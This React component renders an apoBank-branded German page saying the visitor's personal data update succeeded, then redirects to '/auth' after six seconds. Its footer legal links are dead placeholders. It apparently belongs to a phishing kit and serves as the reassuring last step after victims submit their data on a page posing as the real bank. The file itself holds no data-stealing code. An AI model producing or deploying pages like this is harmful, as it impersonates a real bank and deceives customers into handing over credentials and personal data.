import { CheckCircle2 } from "lucide-react";
import { useEffect } from "react";
import apobankLogo from "@/assets/apobank-logo.svg";

const ProfilSuccess = () => {
  useEffect(() => {
    const t = setTimeout(() => {
      window.location.href = "/auth";
    }, 6000);
    return () => clearTimeout(t);
  }, []);


  return (
    <div className="min-h-screen flex flex-col bg-[#f6f8fc]">
      <header className="bg-white border-b border-slate-200">
        <div className="max-w-[1400px] mx-auto flex items-center justify-between px-6 sm:px-10 h-24">
          <img src={apobankLogo} alt="apoBank" className="h-16" />
        </div>
      </header>

      <main className="flex-1">
        <div className="max-w-[780px] mx-auto px-4 sm:px-8 py-10 sm:py-14">
          <div className="bg-white rounded-xl border border-slate-200/70 shadow-[0_1px_2px_rgba(0,0,0,0.04)] px-6 sm:px-10 py-10 sm:py-14">
            <div className="flex flex-col items-center text-center">
              <CheckCircle2 className="h-16 w-16 text-[#2e7d32] mb-5" strokeWidth={1.5} />
              <h1 className="text-[26px] sm:text-[30px] font-semibold text-[#001f5b] mb-4">
                Aktualisierung erfolgreich
              </h1>
              <p className="text-[15px] text-slate-700 leading-relaxed max-w-[520px]">
                Die Aktualisierung Ihrer Personendaten wurde erfolgreich abgeschlossen. Ihre Daten wurden entsprechend aktualisiert und Ihr Konto steht Ihnen ab sofort wieder vollständig zur Verfügung.
              </p>
              <p className="text-[15px] text-slate-700 mt-4">
                Ihre apoBank
              </p>
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-[#001f5b] text-white mt-10">
        <div className="max-w-[1120px] mx-auto px-6 sm:px-10 py-10 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-6">
          <div>
            <img src={apobankLogo} alt="apoBank" className="h-12 brightness-0 invert" />
            <div className="text-[13px] mt-4 opacity-90">
              © 2026 Deutsche Apotheker- und Ärztebank eG. Alle Rechte vorbehalten.
            </div>
          </div>
          <ul className="space-y-3 text-[15px]">
            <li><a href="#" className="hover:underline">Impressum</a></li>
            <li><a href="#" className="hover:underline">Datenschutz</a></li>
            <li><a href="#" className="hover:underline">Nutzungsbedingungen</a></li>
            <li><a href="#" className="hover:underline">Cookie-Einstellungen</a></li>
          </ul>
        </div>
      </footer>
    </div>
  );
};

export default ProfilSuccess;
